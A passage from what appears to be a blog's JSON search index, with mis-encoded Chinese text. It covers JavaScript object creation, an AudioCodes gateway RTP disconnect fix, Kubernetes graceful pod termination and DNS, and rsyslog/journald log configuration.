","title":"parseInt(0.0000005)ä¸ºä»€ä¹ˆç­‰äº5ï¼Ÿ"},{"content":"let a = {} let b = Object.create({}) let c = Object.create(null) console.log(a,b,c) ä¸Šé¢ä¸‰ä¸ªå¯¹è±¡çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\n","permalink":"https://wdd.js.org/fe/js-object-create/","summary":"let a = {} let b = Object.create({}) let c = Object.create(null) console.log(a,b,c) ä¸Šé¢ä¸‰ä¸ªå¯¹è±¡çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ","title":"{} Object.create({}) Object.create{null}çš„åŒºåˆ«ï¼Ÿ"},{"content":"é€šè¯10å¤šç§’åï¼Œfså¯¹ä¸¤ä¸ªcall legå‘é€byeæ¶ˆæ¯ã€‚\nByeæ¶ˆæ¯ç»™çš„åŸå› æ˜¯ Reason: Q.850 ;cause=31 ;text=â€local, RTP Broken Connectionâ€\nåœ¨é€šè¯çš„å‰10å¤šç§’ï¼ŒSIPä¿¡ä»¤æ­£å¸¸ï¼ŒåŒæ–¹ä¹Ÿèƒ½å¬åˆ°å¯¹æ–¹çš„å£°éŸ³ã€‚\né¦–å…ˆæ’æŸ¥äº†ä¸‹fsæ—¥å¿—ï¼Œæ²¡å‘ç°ä»€ä¹ˆå¼‚å¸¸ã€‚ç„¶åæ ¹æ®è¿™ä¸ªæŠ¥é”™å†…å®¹ï¼Œåœ¨ç½‘ä¸Šæœäº†ä¸‹ã€‚\nå‘ç°äº†è¿™ç¯‡æ–‡ç«  https://www.wavecoreit.com/blog/serverconfig/call-drop-transfer-rtp-broken-connection/\nè¿™ç¯‡æ–‡ç« ç»™å‡ºçš„è§£å†³åŠæ³•æ˜¯é€šè¿‡é…ç½®äº†å¥¥ç§‘AudioCodesç½‘å…³æ¥è§£å†³çš„ã€‚\nç„¶åå’¨è¯¢äº†ä¸‹å®¢æˆ·ï¼Œè¯å®ä»–ä»¬ç”¨çš„ä¹Ÿæ˜¯å¥¥ç§‘ç½‘å…³ã€‚æ‰€ä»¥å°±å‚è€ƒæ•™ç¨‹ï¼Œé…åˆ¶äº†ä¸€ä¸‹ã€‚\nä¸»è¦æ˜¯åœ¨ä¸¤ä¸ªåœ°æ–¹è¿›è¡Œé…ç½®\nClick Setup -\u0026gt; Signaling\u0026amp;Media -\u0026gt; Expand Coders \u0026amp; Profiles -\u0026gt; Click IP Profiles -\u0026gt; Edityour SFB Profile -\u0026gt; Broken Connection Mode-\u0026gt; Select Ignore -\u0026gt; Click Apply\nExpand SIP Definitions -\u0026gt; Click SIP Definitions General Settings -\u0026gt; Broken Connection Mode -\u0026gt; Select Ignore -\u0026gt; Click Apply -\u0026gt; Click Save\nè¿™ä¸¤ä¸ªåœ°æ–¹ï¼Œéƒ½æ˜¯é…ç½®Broken Connection Modeï¼Œé€‰æ‹©ignoreæ¥è®¾ç½®çš„ã€‚\nå…³äºRTPçš„connection modeï¼Œæœ‰æ—¶é—´å†ç ”ç©¶ä¸‹ã€‚\n","permalink":"https://wdd.js.org/opensips/ch7/rtp-broken-connection/","summary":"é€šè¯10å¤šç§’åï¼Œfså¯¹ä¸¤ä¸ªcall legå‘é€byeæ¶ˆæ¯ã€‚\nByeæ¶ˆæ¯ç»™çš„åŸå› æ˜¯ Reason: Q.850 ;cause=31 ;text=â€local, RTP Broken Connectionâ€\nåœ¨é€šè¯çš„å‰10å¤šç§’ï¼ŒSIPä¿¡ä»¤æ­£å¸¸ï¼ŒåŒæ–¹ä¹Ÿèƒ½å¬åˆ°å¯¹æ–¹çš„å£°éŸ³ã€‚\né¦–å…ˆæ’æŸ¥äº†ä¸‹fsæ—¥å¿—ï¼Œæ²¡å‘ç°ä»€ä¹ˆå¼‚å¸¸ã€‚ç„¶åæ ¹æ®è¿™ä¸ªæŠ¥é”™å†…å®¹ï¼Œåœ¨ç½‘ä¸Šæœäº†ä¸‹ã€‚\nå‘ç°äº†è¿™ç¯‡æ–‡ç«  https://www.wavecoreit.com/blog/serverconfig/call-drop-transfer-rtp-broken-connection/\nè¿™ç¯‡æ–‡ç« ç»™å‡ºçš„è§£å†³åŠæ³•æ˜¯é€šè¿‡é…ç½®äº†å¥¥ç§‘AudioCodesç½‘å…³æ¥è§£å†³çš„ã€‚\nç„¶åå’¨è¯¢äº†ä¸‹å®¢æˆ·ï¼Œè¯å®ä»–ä»¬ç”¨çš„ä¹Ÿæ˜¯å¥¥ç§‘ç½‘å…³ã€‚æ‰€ä»¥å°±å‚è€ƒæ•™ç¨‹ï¼Œé…åˆ¶äº†ä¸€ä¸‹ã€‚\nä¸»è¦æ˜¯åœ¨ä¸¤ä¸ªåœ°æ–¹è¿›è¡Œé…ç½®\nClick Setup -\u0026gt; Signaling\u0026amp;Media -\u0026gt; Expand Coders \u0026amp; Profiles -\u0026gt; Click IP Profiles -\u0026gt; Edityour SFB Profile -\u0026gt; Broken Connection Mode-\u0026gt; Select Ignore -\u0026gt; Click Apply\nExpand SIP Definitions -\u0026gt; Click SIP Definitions General Settings -\u0026gt; Broken Connection Mode -\u0026gt; Select Ignore -\u0026gt; Click Apply -\u0026gt; Click Save\nè¿™ä¸¤ä¸ªåœ°æ–¹ï¼Œéƒ½æ˜¯é…ç½®Broken Connection Modeï¼Œé€‰æ‹©ignoreæ¥è®¾ç½®çš„ã€‚\nå…³äºRTPçš„connection modeï¼Œæœ‰æ—¶é—´å†ç ”ç©¶ä¸‹ã€‚","title":"å¥¥ç§‘ç½‘å…³ Rtp Broken Connection"},{"content":"åŸæ–‡ï¼šhttps://cloud.google.com/blog/products/gcp/kubernetes-best-practices-terminating-with-grace\nEditorâ€™s note: Today is the fifth installment in a seven-part video and blog series from Google Developer Advocate Sandeep Dinesh on how to get the most out of your Kubernetes environment.\nWhen it comes to distributed systems, handling failure is key. Kubernetes helps with this by utilizing controllers that can watch the state of your system and restart services that have stopped performing. On the other hand, Kubernetes can often forcibly terminate your application as part of the normal operation of the system.\nIn this episode of â€œKubernetes Best Practices,â€ letâ€™s take a look at how you can help Kubernetes do its job more efficiently and reduce the downtime your applications experience.\nIn the pre-container world, most applications ran on VMs or physical machines. If an application crashed, it took quite a while to boot up a replacement. If you only had one or two machines to run the application, this kind of time-to-recovery was unacceptable.\nInstead, it became common to use process-level monitoring to restart applications when they crashed. If the application crashed, the monitoring process could capture the exit code and instantly restart the application.\nWith the advent of systems like Kubernetes, process monitoring systems are no longer necessary, as Kubernetes handles restarting crashed applications itself. Kubernetes uses an event loop to make sure that resources such as containers and nodes are healthy. This means you no longer need to manually run these monitoring processes. If a resource fails a health check, Kubernetes automatically spins up a replacement.\nThe Kubernetes termination lifecycle Kubernetes does a lot more than monitor your application for crashes. It can create more copies of your application to run on multiple machines, update your application, and even run multiple versions of your application at the same time! This means there are many reasons why Kubernetes might terminate a perfectly healthy container. If you update your deployment with a rolling update, Kubernetes slowly terminates old pods while spinning up new ones. If you drain a node, Kubernetes terminates all pods on that node. If a node runs out of resources, Kubernetes terminates pods to free those resources (check out this previous post to learn more about resources).\nItâ€™s important that your application handle termination gracefully so that there is minimal impact on the end user and the time-to-recovery is as fast as possible!\nIn practice, this means your application needs to handle the SIGTERM message and begin shutting down when it receives it. This means saving all data that needs to be saved, closing down network connections, finishing any work that is left, and other similar tasks.\nOnce Kubernetes has decided to terminate your pod, a series of events takes place. Letâ€™s look at each step of the Kubernetes termination lifecycle.\n1 - Pod is set to the â€œTerminatingâ€ State and removed from the endpoints list of all Services At this point, the pod stops getting new traffic. Containers running in the pod will not be affected. 2 - preStop Hook is executed The preStop Hook is a special command or http request that is sent to the containers in the pod. If your application doesnâ€™t gracefully shut down when receiving a SIGTERM you can use this hook to trigger a graceful shutdown. Most programs gracefully shut down when receiving a SIGTERM, but if you are using third-party code or are managing a system you donâ€™t have control over, the preStop hook is a great way to trigger a graceful shutdown without modifying the application.\n3 - SIGTERM signal is sent to the pod At this point, Kubernetes will send a SIGTERM signal to the containers in the pod. This signal lets the containers know that they are going to be shut down soon. Your code should listen for this event and start shutting down cleanly at this point. This may include stopping any long-lived connections (like a database connection or WebSocket stream), saving the current state, or anything like that.\nEven if you are using the preStop hook, it is important that you test what happens to your application if you send it a SIGTERM signal, so you are not surprised in production!\n4 - Kubernetes waits for a grace period At this point, Kubernetes waits for a specified time called the termination grace period. By default, this is 30 seconds. Itâ€™s important to note that this happens in parallel to the preStop hook and the SIGTERM signal. Kubernetes does not wait for the preStop hook to finish. If your app finishes shutting down and exits before the terminationGracePeriod is done, Kubernetes moves to the next step immediately.\nIf your pod usually takes longer than 30 seconds to shut down, make sure you increase the grace period. You can do that by setting the terminationGracePeriodSeconds option in the Pod YAML. For example, to change it to 60 seconds:\n5 - SIGKILL signal is sent to pod, and the pod is removed If the containers are still running after the grace period, they are sent the SIGKILL signal and forcibly removed. At this point, all Kubernetes objects are cleaned up as well.\nConclusion Kubernetes can terminate pods for a variety of reasons, and making sure your application handles these terminations gracefully is core to creating a stable system and providing a great user experience.\nkubectl explain deployment.spec.template.spec KIND: Deployment VERSION: apps/v1 FIELD: terminationGracePeriodSeconds \u0026lt;integer\u0026gt; DESCRIPTION: Optional duration in seconds the pod needs to terminate gracefully. May be decreased in delete request. Value must be non-negative integer. The value zero indicates delete immediately. If this value is nil, the default grace period will be used instead. The grace period is the duration in seconds after the processes running in the pod are sent a termination signal and the time when the processes are forcibly halted with a kill signal. Set this value longer than the expected cleanup time for your process. Defaults to 30 seconds. 1. å‚è€ƒ https://stackoverflow.com/questions/35453792/pods-stuck-in-terminating-status ","permalink":"https://wdd.js.org/container/terminating-with-grace/","summary":"åŸæ–‡ï¼šhttps://cloud.google.com/blog/products/gcp/kubernetes-best-practices-terminating-with-grace\nEditorâ€™s note: Today is the fifth installment in a seven-part video and blog series from Google Developer Advocate Sandeep Dinesh on how to get the most out of your Kubernetes environment.\nWhen it comes to distributed systems, handling failure is key. Kubernetes helps with this by utilizing controllers that can watch the state of your system and restart services that have stopped performing. On the other hand, Kubernetes can often forcibly terminate your application as part of the normal operation of the system.","title":"ä¼˜é›…åœæ­¢çš„pod"},{"content":"1. åŒä¸€ä¸ªNodeä¸Šçš„podç½‘æ®µç›¸åŒ kube-node1 pod1: 172.16.30.8 pod2: 172.16.30.9 pod3: 172.16.30.23 kube-node2 pod4: 172.18.0.5 pod5: 172.18.0.6 2. podä¸­service name dnsè§£æ ä½¿ç”¨nslookupå‘½ä»¤å»æŸ¥è¯¢service name\nç¬¬2è¡Œ DNSæœåŠ¡å™¨å ç¬¬3è¡Œ DNSæœåŠ¡å™¨åœ°å€ ç¬¬5è¡Œ ç›®æ ‡ä¸»æœºçš„åç§° ç¬¬6è¡Œ ç›®æ ‡ä¸»æœºçš„IPåœ°å€ bash-5.0# nslookup security Server:\t10.254.10.20 Address:\t10.254.10.20#53 Name:\tsecurity.test.svc.cluster.local Address: 10.254.63.136 2.1. é—®é¢˜1ï¼š é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆæˆ‘è¦è§£æçš„åŸŸåæ˜¯security, ä½†æ˜¯è¿”å›çš„ä¸»æœºåæ˜¯security.test.svc.cluster.localå‘¢ï¼Ÿ\nbash-5.0# cat /etc/resolv.conf nameserver 10.254.10.20 search test.svc.cluster.local svc.cluster.local cluster.local options ndots:5 åœ¨/etc/resolve.confä¸­ï¼Œsearché€‰é¡¹åæœ‰å‡ ä¸ªå€¼ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼Œå¦‚æœä½ æœç´¢çš„ä¸»æœºåä¸­æ²¡æœ‰ç‚¹, é‚£ä¹ˆä½ è¾“å…¥çš„åå­—å°±ä¼šå’Œsearché€‰ä¸­çš„åå­—ç»„åˆï¼Œä¹Ÿå°±æ˜¯è¯´ã€‚\nä½ è¾“å…¥çš„æ˜¯abc, é‚£ä¹ˆå°±ä¼šæŒ‰ç…§å¦‚ä½•ä¸‹çš„é¡ºåºå»è§£æåŸŸå\nabc.test.svc.cluster.local abc.svc.cluster.local cluster.local æ‰€ä»¥æˆ‘ä»¬çœ‹åˆ°çš„dnsè§£æçš„åå­—å°±æ˜¯abc.test.svc.cluster.localã€‚\n2.2. é—®é¢˜2ï¼š åœ¨resolve.confä¸­ï¼ŒdnsæœåŠ¡å™¨çš„åœ°å€æ˜¯10.254.10.20ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€è¿è¡Œçš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\næˆ‘ä»¬ç”¨dnsåå‘è§£æï¼Œå°†IPè§£æä¸ºåŸŸåï¼Œå¯ä»¥çœ‹åˆ°ä¸»æœºçš„åç§°ä¸ºkube-dns.kube-system.svc.cluster.local.\nbash-5.0# nslookup 10.254.10.20 20.10.254.10.in-addr.arpa\tname = kube-dns.kube-system.svc.cluster.local. è€Œå®é™…ä¸Šï¼Œè¿™ä¸ªIPåœ°å€å°±æ˜¯kube-dnsçš„åœ°å€ã€‚\n[root@kube-m ~]# kubectl get service -n kube-system -o wide NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR kube-dns ClusterIP 10.254.10.20 \u0026lt;none\u0026gt; 53/UDP,53/TCP 15d k8s-app=kube-dns è€Œk8s-app=kube-dnsè¿™ä¸ªlabelå¯ä»¥é€‰ä¸­coredns\n[root@kube-m ~]# kubectl get pod -l k8s-app=kube-dns -nkube-system NAME READY STATUS RESTARTS AGE coredns-79f9c855c5-nrk88 1/1 Running 0 15d coredns-79f9c855c5-x75rq 1/1 Running 0 5h45m ","permalink":"https://wdd.js.org/container/k8s-network/","summary":"1. åŒä¸€ä¸ªNodeä¸Šçš„podç½‘æ®µç›¸åŒ kube-node1 pod1: 172.16.30.8 pod2: 172.16.30.9 pod3: 172.16.30.23 kube-node2 pod4: 172.18.0.5 pod5: 172.18.0.6 2. podä¸­service name dnsè§£æ ä½¿ç”¨nslookupå‘½ä»¤å»æŸ¥è¯¢service name\nç¬¬2è¡Œ DNSæœåŠ¡å™¨å ç¬¬3è¡Œ DNSæœåŠ¡å™¨åœ°å€ ç¬¬5è¡Œ ç›®æ ‡ä¸»æœºçš„åç§° ç¬¬6è¡Œ ç›®æ ‡ä¸»æœºçš„IPåœ°å€ bash-5.0# nslookup security Server:\t10.254.10.20 Address:\t10.254.10.20#53 Name:\tsecurity.test.svc.cluster.local Address: 10.254.63.136 2.1. é—®é¢˜1ï¼š é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆæˆ‘è¦è§£æçš„åŸŸåæ˜¯security, ä½†æ˜¯è¿”å›çš„ä¸»æœºåæ˜¯security.test.svc.cluster.localå‘¢ï¼Ÿ\nbash-5.0# cat /etc/resolv.conf nameserver 10.254.10.20 search test.svc.cluster.local svc.cluster.local cluster.local options ndots:5 åœ¨/etc/resolve.confä¸­ï¼Œsearché€‰é¡¹åæœ‰å‡ ä¸ªå€¼ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼Œå¦‚æœä½ æœç´¢çš„ä¸»æœºåä¸­æ²¡æœ‰ç‚¹, é‚£ä¹ˆä½ è¾“å…¥çš„åå­—å°±ä¼šå’Œsearché€‰ä¸­çš„åå­—ç»„åˆï¼Œä¹Ÿå°±æ˜¯è¯´ã€‚\nä½ è¾“å…¥çš„æ˜¯abc, é‚£ä¹ˆå°±ä¼šæŒ‰ç…§å¦‚ä½•ä¸‹çš„é¡ºåºå»è§£æåŸŸå\nabc.test.svc.cluster.local abc.svc.cluster.local cluster.local æ‰€ä»¥æˆ‘ä»¬çœ‹åˆ°çš„dnsè§£æçš„åå­—å°±æ˜¯abc.test.svc.cluster.localã€‚\n2.2. é—®é¢˜2ï¼š åœ¨resolve.confä¸­ï¼ŒdnsæœåŠ¡å™¨çš„åœ°å€æ˜¯10.254.10.20ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€è¿è¡Œçš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\næˆ‘ä»¬ç”¨dnsåå‘è§£æï¼Œå°†IPè§£æä¸ºåŸŸåï¼Œå¯ä»¥çœ‹åˆ°ä¸»æœºçš„åç§°ä¸ºkube-dns.kube-system.svc.cluster.local.\nbash-5.0# nslookup 10.254.10.20 20.10.254.10.in-addr.arpa\tname = kube-dns.","title":"K8s pod nodeç½‘ç»œ"},{"content":" 1. åºè¨€ æ—¥å¿—æ–‡ä»¶åŒ…å«ç³»ç»Ÿçš„è¿è¡Œä¿¡æ¯ï¼ŒåŒ…æ‹¬å†…æ ¸ã€æœåŠ¡ã€åº”ç”¨ç¨‹åºç­‰çš„æ—¥å¿—ã€‚æ—¥å¿—åœ¨åˆ†æç³»ç»Ÿæ•…éšœã€æ’æŸ¥åº”ç”¨é—®é¢˜ç­‰æ–¹é¢ï¼Œæœ‰ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚\n2. å“ªäº›è¿›ç¨‹è´Ÿè´£ç®¡ç†æ—¥å¿—ï¼Ÿ é»˜è®¤æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä¸Šæœ‰ä¸¤ä¸ªå®ˆæŠ¤è¿›ç¨‹æœåŠ¡ç®¡ç†æ—¥å¿—ã€‚journaldå’Œrsyslogdã€‚\njournaldæ˜¯systemdçš„ä¸€ä¸ªç»„ä»¶ï¼Œjournaldçš„è´Ÿè´£æ”¶é›†æ—¥å¿—ï¼Œæ—¥å¿—å¯ä»¥æ¥è‡ª\nSyslogæ—¥å¿— å†…æ ¸æ—¥å¿— åˆå§‹åŒ–å†…å­˜æ—¥å¿— å¯åŠ¨æ—¥å¿— æ‰€æœ‰æœåŠ¡å†™åˆ°æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯çš„æ—¥å¿— journalæ”¶é›†å¹¶æ•´ç†æ”¶åˆ°çš„æ—¥å¿—ï¼Œä½¿å…¶æ˜“äºè¢«ä½¿ç”¨ã€‚\næœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„\né»˜è®¤æƒ…å†µä¸‹ï¼Œjournalçš„æ—¥å¿—æ˜¯ä¸ä¼šæŒä¹…åŒ–çš„ã€‚ journalçš„æ—¥å¿—æ˜¯äºŒè¿›åˆ¶çš„æ ¼å¼ï¼Œå¹¶ä¸èƒ½ä½¿ç”¨æ–‡æœ¬æŸ¥çœ‹å·¥å…·ï¼Œä¾‹å¦‚cat, æˆ–è€…vimå»åˆ†æã€‚journalçš„æ—¥å¿—éœ€è¦ç”¨journalctlå‘½ä»¤å»è¯»å–ã€‚ journaldä¼šæŠŠæ—¥å¿—å†™åˆ°ä¸€ä¸ªsocketä¸­ï¼Œrsyslogå¯ä»¥é€šè¿‡è¿™ä¸ªsocketæ¥è·å–æ—¥å¿—ï¼Œç„¶åå»å†™æ–‡ä»¶ã€‚\n3. æ—¥å¿—æ–‡ä»¶æ–‡ä»¶ä½ç½® æ—¥å¿—æ–‡ä»¶ä½ç½® /var/log/ ç›®å½• 4. æ—¥å¿—é…ç½®æ–‡ä»¶ä½ç½® /etc/rsyslog.confÂ rsyslogdé…ç½®æ–‡ä»¶ /etc/logrotate.confÂ æ—¥å¿—å›æ»šçš„ç›¸å…³é…ç½® /etc/systemd/journald.confÂ journaldçš„é…ç½®æ–‡ä»¶ 5. rsyslog.conf 5.1. æ¨¡å—åŠ è½½ æ³¨æ„ imjournalå°±æ˜¯ç”¨æ¥è´Ÿè´£è®¿é—®journalä¸­çš„æ—¥å¿— imuxsock æä¾›æœ¬åœ°æ—¥å¿—è¾“å…¥æ”¯æŒï¼Œä¾‹å¦‚ä½¿ç”¨loggerå‘½ä»¤è¾“å…¥æ—¥å¿— $ModLoad imuxsock # provides support for local system logging (e.g. via logger command) $ModLoad imjournal # provides access to the systemd journal 5.2. è¿‡æ»¤ 5.2.1. ä¼˜å…ˆçº§è¿‡æ»¤ **æ¨¡å¼ï¼šFACILITY.**PRIORITY\nè®¾å¤‡(FACILITY):Â kern (0), user (1), mail (2), daemon (3), auth (4), syslog (5), lpr (6), news (7), cron (8), authpriv (9), ftp (10), and local0 through local7 (16 - 23). æ—¥å¿—ç­‰çº§ï¼šdebug (7), info (6), notice (5), warning (4), err (3), crit (2), alert (1), and emerg (0). æ­£åˆ™ = æŒ‡å®šæŸä¸ªçº§åˆ« ! æ’é™¤æŸä¸ªçº§åˆ« åŒ¹é…æ‰€æœ‰çº§åˆ« Example:Â kern.* #é€‰æ‹©æ‰€æœ‰çš„å†…æ ¸ä¿¡æ¯ mail.crit #é€‰æ‹©æ‰€æœ‰ä¼˜å…ˆçº§é«˜äºç­‰äºcrit cron.!info # é€‰æ‹©cronæ—¥å¿—ä¸æ˜¯infoçº§åˆ«çš„æ—¥å¿— 5.2.2. å±æ€§è¿‡æ»¤ æ¨¡å¼ï¼š:PROPERTY, [!]COMPARE_OPERATION, \u0026ldquo;STRING\u0026rdquo; **\næ¯”è¾ƒæ“ä½œç¬¦ï¼ˆCOMPARE_OPERATIONï¼‰ contains åŒ…å« isequal ç›¸ç­‰ starswitch ä»¥xxxå¼€å¤´ regex æ­£åˆ™åŒ¹é… ** ä¸¾ä¸ªæ¯”è¾ƒå¸¸è§çš„ä¾‹å­.\nå¦‚æœæ—¥å¿—ä¸­åŒ…å« wdd è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå°±æŠŠæ—¥å¿—å†™åˆ°/var/log/wdd.log è¿™ä¸ªæ–‡ä»¶é‡Œã€‚\né¦–å…ˆç¼–è¾‘ä¸€ä¸‹/etc/rsyslog.conf æ–‡ä»¶\næ³¨æ„ :msg è¡¨ç¤ºæ¶ˆæ¯çš„å†…å®¹ è¯¦æƒ…å¯ä»¥å‚è€ƒ man rsyslog.conf å…³äºAvailable Propertiesçš„éƒ¨åˆ†å†…å®¹\n:msg,contains,\u0026#34;wdd\u0026#34; /var/log/wdd.log ä¿å­˜é€€å‡ºï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š\ntouch /var/log/wdd.log # åˆ›å»ºæ–‡ä»¶ systemctl restart rsyslog # é‡å¯æœåŠ¡ logger hello wdd âœ log tail /var/log/wdd.log May 23 19:26:52 VM_0_8_centos root: hello wdd 5.2.3. Action å°†rsyslogå†™æ—¥å¿—æ–‡ä»¶ï¼š\n# æ–¹å¼1ï¼šè¿‡æ»¤å™¨ æ—¥å¿—è·¯å¾„ cron.* /var/log/cron.log # æ–¹å¼2ï¼šè¿‡æ»¤å™¨\t-æ—¥å¿—è·¯å¾„ã€‚æ³¨æ„å¤šäº†ä¸ª- # é»˜è®¤rsyslogæ˜¯åŒæ­¥å†™æ—¥å¿—ï¼ŒåŠ ä¸ª-è¡¨ç¤ºå¼‚æ­¥å†™æ—¥å¿—ã€‚åœ¨å†™æ—¥å¿—æ¯”è¾ƒå¤šæ—¶å€™ï¼Œå¼‚æ­¥çš„å†™å¯ä»¥æé«˜æ€§èƒ½ mail.* -/var/log/cron.log # æ–¹å¼3ï¼šé€šè¿‡ç½‘ç»œå‘é€æ—¥å¿— # @[(zNUMBER)]HOST:[PORT] zNUMBERæ˜¯å‹ç¼©ç­‰çº§ mail.* @192.168.2.3:8000 #é€šè¿‡UDPå‘é€æ—¥å¿— cron.* @@192.168.2.3:8000 #é€šè¿‡TCPå‘é€æ—¥å¿—ï¼Œ æ³¨æ„å¤šäº†ä¸€ä¸ª@ *.* @(2)192.168.2.3:8000 #é€šè¿‡UDPå‘é€æ—¥å¿—ï¼Œæ—¥å¿—ä¼šè¢«å‹ç¼©åå‘é€ï¼Œå‹ç¼©ç­‰çº§æ˜¯2ã€‚æ—¥å¿—å¦‚æœå°‘äº60å­—èŠ‚ï¼Œå°†ä¸ä¼šå‹ç¼© 5.2.4. ä¸¢å¼ƒæ—¥å¿— cron.* stop *.* ~ # rsyslog8 æ”¯æŒç”¨~ä¸¢å¼ƒæ—¥å¿— è¯¦æƒ…å¯ä»¥ï¼šman rsyslog.conf\n5.2.5. æ—¥å¿—å›æ»š man lograte é‡Œé¢æœ‰å¾ˆå¤šæ—¥å¿—\n/var/log/wdd.log { noolddir size 10M rotate 10 sharedscripts postrotate /bin/kill -HUP `cat /var/run/syslogd.pid 2\u0026gt; /dev/null` 2\u0026gt; /dev/null || true /bin/kill -HUP `cat /var/run/rsyslogd.pid 2\u0026gt; /dev/null` 2\u0026gt; /dev/null || true endscript } 6. é€Ÿåº¦é™åˆ¶ 6.1. journaldçš„é€Ÿåº¦é™åˆ¶ RateLimitInterval é™é€Ÿå‘¨æœŸ,é»˜è®¤30s RateLimitBurst é™é€Ÿå€¼, é»˜è®¤é™é€Ÿå€¼1000 é’ˆå¯¹å•ä¸ªservice, åœ¨ä¸€ä¸ªé™é€Ÿå‘¨æœŸå†…ï¼Œå¦‚æœæ¶ˆæ¯é‡è¶…è¿‡é™é€Ÿå€¼ï¼Œåˆ™ä¸¢å¼ƒæœ¬å‘¨æœŸå†…çš„æ‰€æœ‰æ¶ˆæ¯ã€‚\n/etc/systemd/journal.conf\n#RateLimitInterval=30s #RateLimitBurst=1000 å¦‚æœæƒ³å…³é—­é€Ÿåº¦é™åˆ¶ï¼Œå°±å°†RateLimitIntervalè®¾ç½®ä¸º0\nRateLimitInterval=, RateLimitBurst= Configures the rate limiting that is applied to all messages generated on the system. If, in the time interval defined by RateLimitInterval=, more messages than specified in RateLimitBurst= are logged by a service, all further messages within the interval are dropped until the interval is over. A message about the number of dropped messages is generated. This rate limiting is applied per-service, so that two services which log do not interfere with each other\u0026rsquo;s limits. Defaults to 1000 messages in 30s. The time specification for RateLimitInterval= may be specified in the following units: \u0026ldquo;s\u0026rdquo;, \u0026ldquo;min\u0026rdquo;, \u0026ldquo;h\u0026rdquo;, \u0026ldquo;ms\u0026rdquo;, \u0026ldquo;us\u0026rdquo;. To turn off any kind of rate\nlimiting, set either value to 0.\n6.2. rsyslogçš„é€Ÿåº¦é™åˆ¶ /etc/rsyslog.conf\n$SystemLogRateLimitInterval 2 # å•ä½æ˜¯s $SystemLogRateLimitBurst 50 å¦‚æœè¦å…³é—­é€Ÿåº¦é™åˆ¶ï¼Œå°±å°†SystemLogRateLimitIntervalè®¾ç½®ä¸º0\n7. journal æ—¥å¿—æ¸…ç† \u0026ndash;vacuum-size=, \u0026ndash;vacuum-time= Removes archived journal files until the disk space they use falls below the specified size (specified with the usual \u0026ldquo;K\u0026rdquo;, \u0026ldquo;M\u0026rdquo;, \u0026ldquo;G\u0026rdquo;, \u0026ldquo;T\u0026rdquo;\nsuffixes), or all journal files contain no data older than the specified timespan (specified with the usual \u0026ldquo;s\u0026rdquo;, \u0026ldquo;min\u0026rdquo;, \u0026ldquo;h\u0026rdquo;, \u0026ldquo;days\u0026rdquo;,\n\u0026ldquo;months\u0026rdquo;, \u0026ldquo;weeks\u0026rdquo;, \u0026ldquo;years\u0026rdquo; suffixes). Note that running \u0026ndash;vacuum-size= has only indirect effect on the output shown by \u0026ndash;disk-usage as\nthe latter includes active journal files, while the former only operates on archived journal files. \u0026ndash;vacuum-size= and \u0026ndash;vacuum-time=\nmay be combined in a single invocation to enforce both a size and time limit on the archived journal files.\nå‘ç° /var/log/journalçš„ç›®å½•å±…ç„¶æœ‰4Gã€‚\næ‰€ä»¥éœ€è¦æ¸…ç†ã€‚\n7.1. æ‰‹åŠ¨æ¸…ç† journalctl --vacuum-time=2d # ä¿ç•™æœ€è¿‘ä¸¤å¤© journalctl --vacuum-size=500M # ä¿ç•™æœ€è¿‘500MB æŒ‰å¤©æ‰§è¡Œä¸€æ¬¡è¯•è¯•ï¼š\njournalctl --vacuum-time=2d Vacuuming done, freed 3.9G of archived journals on disk. 7.2. ä¿®æ”¹é…ç½® ä¸ºäº†é¿å…ä»¥åè¿˜éœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Œå¯ä»¥ä¿®æ”¹/etc/systemd/journal.confæ–‡ä»¶\nä¾‹å¦‚å°†æœ€å¤§ä½¿ç”¨æ”¹ä¸º200M\nSystemMaxUse=200M é‡å¯journald:Â systemctl restart systemd-journald 8. linux æ—¥å¿—æ–‡ä»¶ç®€ä»‹ inuxçš„æ—¥å¿—ä½äº/var/logç›®å½•ä¸‹ã€‚\næ—¥å¿—ä¸»è¦åˆ†ä¸º4ç±»\n1 åº”ç”¨æ—¥å¿— 2 äº‹ä»¶æ—¥å¿— 3 æœåŠ¡æ—¥å¿— 4 ç³»ç»Ÿæ—¥å¿— æ—¥å¿—å†…å®¹\n/var/log/messages æ™®é€šåº”ç”¨çº§åˆ«æ´»åŠ¨ /var/log/auth.log ç”¨æˆ·éªŒè¯ç›¸å…³äº‹ä»¶ /var/log/secure ç³»ç»Ÿæˆæƒ /var/log/boot.log ç³»ç»Ÿå¯åŠ¨æ—¥å¿— /var/log/dmesg.log ç¡¬ä»¶è®¾å¤‡ç›¸å…³ /var/log/kern.log å†…æ ¸æ—¥å¿— /var/log/faillog å¤±è´¥çš„ç™»å½•å°è¯•æ—¥å¿— /var/log/cron crontabè®¡åˆ’ä»»åŠ¡æ—¥å¿— /var/log/yum.log åŒ…å®‰è£…æ—¥å¿— /var/log/maillog /var/log/mail.log é‚®ä»¶æœåŠ¡ç›¸å…³æ—¥å¿— /var/log/httpd/ Apache webæœåŠ¡å™¨æ—¥å¿— /var/log/mysql.log /var/log/mysqld.log mysqlç›¸å…³æ—¥å¿— ","permalink":"https://wdd.js.org/posts/2022/10/linux-journal/","summary":"1. åºè¨€ æ—¥å¿—æ–‡ä»¶åŒ…å«ç³»ç»Ÿçš„è¿è¡Œä¿¡æ¯ï¼ŒåŒ…æ‹¬å†…æ 